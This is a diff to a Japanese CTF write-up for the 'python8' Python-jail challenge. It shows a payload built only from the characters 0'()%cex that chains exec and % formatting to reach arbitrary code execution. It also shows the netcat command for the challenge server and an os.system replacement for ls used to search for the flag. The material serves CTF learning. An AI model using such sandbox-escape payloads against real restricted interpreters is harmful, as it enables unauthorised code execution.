@@ -4,18 +4,18 @@ $ python8
 
 `nc 160.251.183.149 3838`
 
-Attachment\
-[python8.zip](https://github.com/colza12/ctf_writeup/blob/main/SatokiCTF/Misc/python8/python8.zip)
+Attachment  
+[python8.zip](python8.zip)
 
-Difficulty Level : medium\
+Difficulty Level : medium  
 Point : 300
 
 # Solution
-添付ファイルを見てみると、使える文字が`0'()%cex`だけに制限されていた。\
-Python8は未来すぎて使える文字が8文字しかないらしい。\
-使える文字からして、明らかに`exec`と`%`を使えとのことだろう。\
-`exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))`が使えるという情報を頂いたのでそのまま使わせていただきました。(この部分はどうしても分からなかった...コードを見れば理解できるが、自分で作るとなると...)\
-python8.pyを実行して上記コードを投げると、任意の関数を実行できるようになる。(上記コードの解析依頼をChatGPT君に投げたら、バグりかけて途中で停止し正常動作に戻ったのはすごかった。さすがです。)\
+添付ファイルを見てみると、使える文字が`0'()%cex`だけに制限されていた。  
+Python8は未来すぎて使える文字が8文字しかないらしい。  
+使える文字からして、明らかに`exec`と`%`を使えとのことだろう。  
+`exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))`が使えるという情報を頂いたのでそのまま使わせていただきました。(この部分はどうしても分からなかった...コードを見れば理解できるが、自分で作るとなると...)  
+python8.pyを実行して上記コードを投げると、任意の関数を実行できるようになる。(上記コードの解析依頼をChatGPT君に投げたら、バグりかけて途中で停止し正常動作に戻ったのはすごかった。さすがです。)  
 `ls`、`cd`、`cat`を使ってflagを探したいが、これはLinuxではなくPythonなので、コマンドをそれぞれ置き換える(Linux環境で実行している場合はコメントの方を使用しても良い)。
 ```python
 ls = import os; print('\n'.join(os.listdir('.')))    # ls = import os; os.system('ls')
